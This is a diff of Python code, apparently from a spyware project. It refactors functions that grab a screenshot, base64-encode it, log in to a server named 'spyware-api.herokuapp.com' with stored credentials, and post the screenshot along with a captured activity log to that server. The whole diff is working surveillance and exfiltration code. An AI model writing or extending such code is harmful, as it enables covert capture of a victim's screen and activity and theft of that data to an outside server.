@@ -80,7 +80,7 @@ def getProcess():
     return process
 
 
-def getImage(self):
+def getImage():
     buffer = io.BytesIO()
     image = ImageGrab.grab()
     image.save(buffer, format='png')
@@ -90,7 +90,7 @@ def getImage(self):
     return str(b64_str)
 
 
-def doLogin(self):
+def doLogin():
     dataUser = json.dumps({"login": cr.login, "password": cr.password})
     token = requests.post("https://spyware-api.herokuapp.com/login", dataUser).text
     logging("Login realizado, token:" + token + "\n")
@@ -100,11 +100,11 @@ def doLogin(self):
     }
 
 
-def sendAlert(self):
-    headers = doLogin(self)
+def sendAlert(log):
+    headers = doLogin()
 
     try:
-        dataImage = json.dumps({"id": 0, "productImg": self.log, "base64Img": getImage(self)}, sort_keys=True, indent=4)
+        dataImage = json.dumps({"id": 0, "productImg": log, "base64Img": getImage()}, sort_keys=True, indent=4)
         image = requests.post("https://spyware-api.herokuapp.com/imagem/save", dataImage,
                               headers=headers)
         imageJson = json.loads(image.content)
